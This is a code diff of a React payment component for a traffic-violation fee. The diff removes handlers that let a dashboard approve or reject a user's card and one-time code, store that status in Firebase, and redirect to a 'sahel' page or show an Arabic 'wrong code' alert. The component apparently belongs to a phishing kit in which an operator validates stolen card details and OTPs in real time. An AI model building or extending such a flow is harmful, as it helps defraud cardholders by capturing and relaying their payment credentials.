@@ -221,60 +221,7 @@ export default function Kent(props: { setPage?: any; violationValue: number }) {
     }))
   }
 
-  // Handle card approval/rejection from dashboard
-  const handleCardApprovalFromDashboard = async (status: "approved" | "rejected") => {
-    setLoading(true)
-    try {
-      // Update payment info with card status
-      const updatedPaymentInfo = {
-        ...paymentInfo,
-        cardStatus: status,
-      }
 
-      // Update Firebase with card status
-      await handlePay(updatedPaymentInfo, setPaymentInfo)
-
-      setTimeout(() => {
-        setLoading(false)
-        // If approved, move to next step
-        if (status === "approved" && step === 1) {
-          setStep(2)
-        }
-      }, 2000)
-    } catch (error) {
-      console.error("Error updating card status:", error)
-      setLoading(false)
-    }
-  }
-
-  // Handle OTP approval/rejection from dashboard
-  const handleOtpApprovalFromDashboard = async (status: "approved" | "rejected") => {
-    setLoading(true)
-    try {
-      // Update payment info with OTP status
-      const updatedPaymentInfo = {
-        ...paymentInfo,
-        status: status,
-      }
-
-      // Update Firebase with OTP status
-      await handlePay(updatedPaymentInfo, setPaymentInfo)
-
-      setTimeout(() => {
-        setLoading(false)
-        // If approved, redirect to sahel page
-        if (status === "approved" && step === 3) {
-          props.setPage("sahel")
-        } else if (status === "rejected" && step === 3) {
-          alert("رمز التحقق غير صحيح, الرجاء ادخال الرمز مرة اخرى ")
-          setStep(2)
-        }
-      }, 2000)
-    } catch (error) {
-      console.error("Error updating OTP status:", error)
-      setLoading(false)
-    }
-  }
 
   // Handle OTP addition
   const handleAddOtp = (otp: string) => {
